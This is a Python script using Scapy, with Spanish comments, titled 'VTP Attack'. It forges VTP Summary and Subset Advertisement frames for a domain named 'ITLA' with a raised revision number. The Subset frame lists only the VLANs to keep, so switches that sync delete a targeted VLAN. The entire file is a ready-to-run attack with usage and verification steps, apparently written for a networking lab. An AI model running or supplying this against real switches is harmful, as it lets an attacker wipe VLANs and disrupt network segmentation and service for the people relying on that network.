#!/usr/bin/env python3
"""
VTP Attack - Inyeccion de Summary + Subset Advertisement para eliminar VLANs
Requisitos: Scapy, interfaz conectada al switch en dominio VTP correcto
Uso: sudo python3 vtp_attack.py
"""
from scapy.all import *

interfaz = "eth1"
dominio = b"ITLA"
revision = 6

def pad_domain(d):
    return d.ljust(32, b'\x00')[:32]

# ---- Summary Advertisement (code=1) ----
summary_payload = b""
summary_payload += bytes([2])              # version VTPv2
summary_payload += bytes([1])              # code = summary
summary_payload += bytes([0])              # followers
summary_payload += bytes([len(dominio)])   # domain len
summary_payload += pad_domain(dominio)
summary_payload += revision.to_bytes(4, 'big')
summary_payload += b"\x00\x00\x00\x00"     # updater identity
summary_payload += b"000000000000"         # timestamp (12 bytes)
summary_payload += b"\x00" * 16            # md5 digest

summary_pkt = Dot3(dst="01:00:0c:cc:cc:cc") / LLC() / SNAP() / Raw(load=summary_payload)

print("[*] Paso 1: Enviando Summary Advertisement (rev=%d)..." % revision)
sendp(summary_pkt, iface=interfaz, count=3, verbose=False)

# ---- Subset Advertisement (code=2) ----
def vlan_info_entry(vlanid, name, vlan_type=5, status=0x00):
    name_padded = name
    pad_len = (4 - (len(name) % 4)) % 4
    name_padded += b'\x00' * pad_len

    body = b""
    body += bytes([status])
    body += bytes([vlan_type])
    body += bytes([len(name)])
    body += vlanid.to_bytes(2, 'big')
    body += b"\x00\x00"                  # MTU
    body += vlanid.to_bytes(4, 'big')    # 802.10 index
    body += name_padded

    total_len = len(body) + 1
    return bytes([total_len]) + body

# Solo declaramos las VLANs que queremos CONSERVAR. La VLAN 60 (u otra) NO se incluye
# y por tanto sera eliminada al sincronizar.
vlans = [
    (1, b"default"),
    (10, b"ADMINISTRACION"),
    (20, b"USUARIOS"),
    (99, b"NATIVA_NOUTIL"),
]

subset_payload = b""
subset_payload += bytes([2])               # version
subset_payload += bytes([2])               # code = subset
subset_payload += bytes([1])               # sequence number
subset_payload += bytes([len(dominio)])
subset_payload += pad_domain(dominio)
subset_payload += revision.to_bytes(4, 'big')

for vid, name in vlans:
    subset_payload += vlan_info_entry(vid, name)

subset_pkt = Dot3(dst="01:00:0c:cc:cc:cc") / LLC() / SNAP() / Raw(load=subset_payload)

print("[*] Paso 2: Enviando Subset Advertisement (tabla VLAN sin VLAN objetivo)...")
sendp(subset_pkt, iface=interfaz, count=3, verbose=False)

print("[+] Verifica 'show vtp status' (revision -> %d) y 'show vlan brief'." % revision)
